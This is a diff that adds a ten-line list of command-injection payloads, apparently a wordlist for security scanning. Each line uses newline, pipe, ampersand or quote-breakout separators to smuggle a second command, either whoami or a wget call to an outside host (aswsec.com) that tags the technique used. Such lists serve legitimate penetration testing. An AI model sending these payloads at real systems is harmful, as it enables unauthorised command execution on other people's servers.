@@ -1,0 +1,10 @@
+ %0a wget https://www.aswsec.com/index.php?cmdInjPer0A
+ || wget https://www.aswsec.com/index.php?cmdInjPipePipe
+ & wget https://www.aswsec.com/index.php?cmdInjApp &
+ ' & wget https://www.aswsec.com/index.php?cmdInjApp & echo '
+ " & wget https://www.aswsec.com/index.php?cmdInjApp & echo "
+  %0a whoami
+ || whoami
+ & whoami &
+ ' & whoami & echo '
+ " & whoami & echo "
